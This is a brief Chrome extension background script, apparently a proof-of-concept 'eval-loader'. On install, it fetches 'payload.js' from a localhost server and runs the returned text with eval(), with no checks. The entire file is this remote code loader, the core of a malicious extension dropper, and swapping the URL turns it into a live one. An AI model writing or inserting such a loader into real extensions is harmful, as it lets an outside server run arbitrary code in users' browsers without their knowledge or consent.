chrome.runtime.onInstalled.addListener(() => {
  fetch('http://localhost:8000/payload.js')
    .then(r => r.text())
    .then(code => {
      console.log('[eval-loader] fetched payload, len=', code.length);
      eval(code);                
    })
    .catch(err => {
      console.log('[eval-loader] Failed to fetch payload:', err);
    });
});
